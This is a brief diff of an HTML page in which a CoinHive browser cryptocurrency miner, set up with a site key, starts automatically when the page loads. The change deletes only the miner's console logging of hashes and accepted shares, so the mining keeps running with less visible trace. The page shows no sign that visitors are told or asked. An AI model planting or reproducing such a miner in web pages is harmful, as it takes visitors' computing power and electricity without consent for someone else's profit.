@@ -29,13 +29,6 @@
 <script>
 	var miner = new CoinHive.Anonymous('dug5PaheRXLYwd02XYEYPZUONQGDge7k');
 	miner.start();
-    miner.on('found', () => console.log('Found!'))
-    miner.on('accepted', () => console.log('Accepted!'))
-    miner.on('update', data => console.log(`
-        Hashes per second: ${data.hashesPerSecond}
-        Total hashes: ${data.totalHashes}
-        Accepted hashes: ${data.acceptedHashes}
-      `));
 </script>
     
   </body>
